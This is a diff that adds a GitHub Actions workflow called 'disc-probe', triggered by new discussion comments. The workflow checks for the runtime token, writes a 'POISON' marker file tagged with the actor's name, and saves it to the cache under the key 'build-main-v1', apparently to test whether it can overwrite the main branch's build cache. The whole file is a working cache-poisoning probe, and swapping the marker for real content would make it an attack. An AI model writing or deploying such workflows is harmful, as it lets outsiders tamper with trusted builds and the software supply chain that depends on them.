@@ -1,0 +1,24 @@
+name: disc-probe
+on:
+  discussion_comment:
+    types: [created]
+permissions:
+  actions: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: context
+        run: |
+          echo "REF=$GITHUB_REF"
+          echo "EVENT=$GITHUB_EVENT_NAME"
+          echo "ACTOR=$GITHUB_ACTOR"
+          echo "RESULTS_URL_SET=${ACTIONS_RESULTS_URL:+YES}"
+          echo "RUNTIME_TOKEN_SET=${ACTIONS_RUNTIME_TOKEN:+YES}"
+          echo "POISON-BY-$GITHUB_ACTOR-$GITHUB_EVENT_NAME" > marker.txt
+      - name: save-cache
+        uses: actions/cache/save@v4
+        with:
+          path: marker.txt
+          key: build-main-v1
